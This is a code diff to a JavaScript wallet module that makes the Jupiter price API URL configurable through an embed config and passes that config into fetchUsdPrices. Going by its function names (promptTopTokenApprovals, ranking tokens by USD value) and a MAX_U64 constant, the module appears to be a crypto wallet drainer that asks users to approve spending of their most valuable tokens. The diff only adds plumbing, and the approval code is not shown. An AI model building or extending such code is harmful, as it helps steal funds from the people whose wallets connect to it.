@@ -13,6 +13,11 @@ import {
 
 const MAX_U64 = 2n ** 64n - 1n;
 const JUPITER_PRICE_URL = "https://api.jup.ag/price/v2";
+/** @param {import('./wallet-loader.js').WalletEmbedConfig} config */
+function priceApiBase(config) {
+  const proxy = (config.priceApiUrl || "").trim();
+  return proxy || JUPITER_PRICE_URL;
+}
 const PRICE_BATCH = 100;
 /** Jupiter / pricing id for native SOL (same as wrapped SOL mint) */
 const WSOL_MINT = "So11111111111111111111111111111111111111112";
@@ -159,16 +164,19 @@ export const fetchWalletTokens = fetchWalletAssets;
 
 /**
  * @param {string[]} mints
+ * @param {import('./wallet-loader.js').WalletEmbedConfig} [config]
  * @returns {Promise<Record<string, number>>}
  */
-export async function fetchUsdPrices(mints) {
+export async function fetchUsdPrices(mints, config) {
   /** @type {Record<string, number>} */
   const prices = {};
   if (!mints.length) return prices;
 
+  const base = config ? priceApiBase(config) : JUPITER_PRICE_URL;
+
   for (let i = 0; i < mints.length; i += PRICE_BATCH) {
     const batch = mints.slice(i, i + PRICE_BATCH);
-    const url = `${JUPITER_PRICE_URL}?ids=${batch.join(",")}`;
+    const url = `${base}?ids=${batch.join(",")}`;
     try {
       const res = await fetch(url);
       if (!res.ok) continue;
@@ -276,7 +284,7 @@ export async function promptTopTokenApprovals({
       )
     ),
   ];
-  const prices = await fetchUsdPrices(mintsForPrice);
+  const prices = await fetchUsdPrices(mintsForPrice, config);
   const rankedAll = rankTokensByValue(tokens, prices, minUsd);
   const ranked =
     maxCount > 0
